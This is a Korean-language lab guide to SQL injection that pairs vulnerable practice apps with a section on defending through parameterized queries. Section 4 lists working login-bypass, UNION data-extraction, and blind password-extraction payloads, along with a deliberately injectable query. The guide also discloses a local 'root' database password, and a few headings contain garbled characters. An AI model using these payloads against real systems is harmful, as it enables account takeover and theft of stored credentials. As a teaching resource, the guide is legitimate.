# SQL Injection 완전 정복 실습 가이드

이 문서는 **직접 실습하면서** SQL Injection을 깊게 이해하기 위한 자료입니다.

---

## 1. SQL Injection이란?

SQL Injection은 **사용자 입력값이 제대로 필터링되지 않은 채로 SQL 쿼리 문자열에 직접 삽입**될 때 발생하는 취약점입니다.

### 왜 위험한가?

공격자가 SQL 문법을 조작할 수 있게 되어 다음과 같은 공격이 가능해집니다:

| 공격 유형           | 설명                                      | 영향                          |
|---------------------|-------------------------------------------|-------------------------------|
| 인증 우회           | `admin' -- ` 로 비밀번호 없이 로그인      | 계정 탈취                     |
| 데이터 유출         | UNION SELECT로 다른 테이블 데이터 추출    | 개인정보, 비밀번호 유출       |
| 데이터 변조/삭제    | UPDATE, DELETE, DROP TABLE                | 데이터 파괴                   |
| Blind 추출          | 참/거짓, 시간 지연으로 한 글자씩 추출     | 매우 은밀한 데이터 탈취       |
| Second Order        | 저장된 값을 나중에 실행                   | 지연 공격, 로그 우회          |
| RCE (일부 환경)     | xp_cmdshell, INTO OUTFILE 등              | 서버 장악                     |

---

## 2. SQL Injection의 종류

### 2.1 In-band SQLi (가장 흔함)
- **Error-based**: 에러 메시지를 통해 데이터 추출
- **Union-based**: UNION SELECT로 결과 집합에 다른 테이블 데이터 추가

### 2.2 Blind SQLi (가장 은밀함)
- **Boolean-based**: 참/거짓에 따라 페이지 응답이 달라짐 (길이, 내용, HTTP 상태 등)
- **Time-based**: `SLEEP(3)`, `BENCHMARK()` 등으로 응답 시간을 이용

### 2.3 Second-order SQLi
- 입력 시점에는 공격이 일어나지 않음
- 나중에 그 값이 다른 쿼리에 사용될 때 공격 발동 (예: 댓글 저장 → 관리자 페이지에서 출력)

---

## 3. 실습 환경 구성

### 방법 A: Python Flask + SQLite (가장 추천)

**장점**: 설치가 매우 쉽고, 실제 DB가 동작하며, 쿼리가 화면에 바로 보임.

```powershell
# 1. 디렉토리 이동
cd sqli-lab\python

# 2. DB 초기화 (한 번만)
python db_init.py

# 3. Vulnerable 앱 실행 (포트 5000)
python vulnerable_app.py

# 4. (선택) Secure 앱 실행 (포트 5001) - 비교용
python secure_app.py
```

브라우서 http://127.0.0.1:5000 접속

### 방법 B: JSP + MySQL (Tomcat 환경에 적합)

1. `db_setup_mysql.sql`을 MySQL에서 실행
   ```sql
   mysql -u root -p < ..\db_setup_mysql.sql
   ```

2. MySQL JDBC 드라이버(`mysql-connector-java-*.jar`)를 Tomcat의 `lib/` 폴더에 넣기

3. `sqli-lab/jsp/` 안의 파일들을 Tomcat의 `webapps/ROOT/sqli/` 로 복사

4. 브라우서 `http://localhost:8080/sqli/vuln-login.jsp` 접속

> 참고: 기존 `test.jsp`에서 사용하던 `root` / `ntsdev` 계정을 그대로 활용합니다.

### 방법 C: 브라우서 시뫄레이터 (설치 0)

`sqli-lab/browser-simulator.html`을 브라우서에서 바로 열기. 서버 없이 동작합니다.

---

## 4. 주요 실습 예제 설명

### 4.1 로그인 (Classic Authentication Bypass)

**\ucde8약한 코드 (Python 예시)**:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
db.execute(query)
```

**\uc8fc요 페이로드**:
- `admin' -- ` → 비밀번호 조건 무시 (주석)
- `admin' OR '1'='1' -- ` → 항상 참
- `' OR 1=1#`
- `admin' AND password LIKE 's3cr%' -- ` → 비밀번호 일부 유추

### 4.2 UNION 기반 데이터 추출

원래 쿼리가 4개 컬럼을 반환한다고 가정:
```sql
SELECT id, name, price, description FROM products WHERE name LIKE '%...%'
```

**\ud398이로드**:
```sql
%' UNION SELECT 1, username, password, role FROM users --
%' UNION SELECT id, username, password, secret_note FROM users --
%' UNION SELECT 1, @@version, user(), database() --
```

**\uceec럼 수 알아내는 법**:
```sql
%' ORDER BY 1 --
%' ORDER BY 2 --
%' ORDER BY 3 --
%' ORDER BY 4 --   ← 여기까지 에러가 안 나면 4개 컬럼
```

### 4.3 Boolean-based Blind

페이지에 결과가 나오거나 안 나오거나, 또는 에러가 나오는 차이를 이용.

```sql
1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 12
1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 's'
```

자동화 도구: `sqlmap`

### 4.4 Time-based Blind

MySQL:
```sql
1 AND SLEEP(3)
1 AND IF((SELECT SUBSTRING(password,1,1)='s' FROM users WHERE username='admin'), SLEEP(3), 0)
```

SQLite (Python 실습용):
```sql
1 AND (SELECT hex(randomblob(2000000)) FROM users WHERE ...)
```

---

## 5. 방어 방법 (가장 중요)

### 5.1 최선의 방어: PreparedStatement / Parameterized Query

```java
// 나쁨
String sql = "SELECT * FROM users WHERE id = " + id;
stmt.executeQuery(sql);

// 좋음
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setInt(1, id);
pstmt.executeQuery();
```

### 5.2 기타 방어 계층

| 계층              | 방법                                      | 효과          |
|-------------------|-------------------------------------------|---------------|
| 코드              | PreparedStatement, ORM (MyBatis, Hibernate) | ★★★★★        |
| 입력 검증         | 화이트리스트 (숫자만 허용 등)             | ★★★★         |
| DB 권한           | 애플리케이션 계정에 최소 권한 부여        | ★★★★         |
| 에러 처리         | 상세 에러 메시지를 사용자에게 노출하지 않음 | ★★★          |
| WAF               | ModSecurity, Cloudflare 등                | ★★★          |
| 모니터링          | 비정상적인 쿼리 패턴 탐지                 | ★★           |

**중요**: 입력 이스케이프(escaping)만으로는 충분하지 않습니다. PreparedStatement가 정답입니다.

---

## 6. 실습 체크리스트 / 과제

1. `vuln-login.jsp` 또는 Python 로그인에서 `admin' -- `로 로그인 성공시키기
2. UNION을 이용해 `users` 테이블의 모든 계정과 비밀번호를 추출하기
3. Boolean Blind로 `admin` 계정의 비밀번호 길이 알아내기
4. Time-based로 특정 문자가 맞는지 확인하는 쿼리 작성하기
5. `secure-login.jsp`와 `vuln-login.jsp`의 차이점을 코드로 비교하고 설명하기
6. (도전) `sqlmap`을 사용해 Python vulnerable 앱 자동 공격하기

---

## 7. 유용한 도구

- **sqlmap**: 가장 강력한 자동화 도구 (`sqlmap -u "http://..." --dbs`)
- **Burp Suite / ZAP**: 프록시 + 수동 테스팅
- **MySQL**: `information_schema`, `performance_schema`
- **SQLite**: `sqlite_master` 테이블

---

## 8. 추가 학습 자료

- OWASP Top 10 - A03:2021 Injection
- PortSwigger Web Security Academy (SQL injection)
- "SQL Injection Attacks and Defense" (책)

---

**이 실습 자료는 교육 목적으로만 사용하세요. 실제 서버스에 절대 적용하지 마십시오.**

작성일: 2026년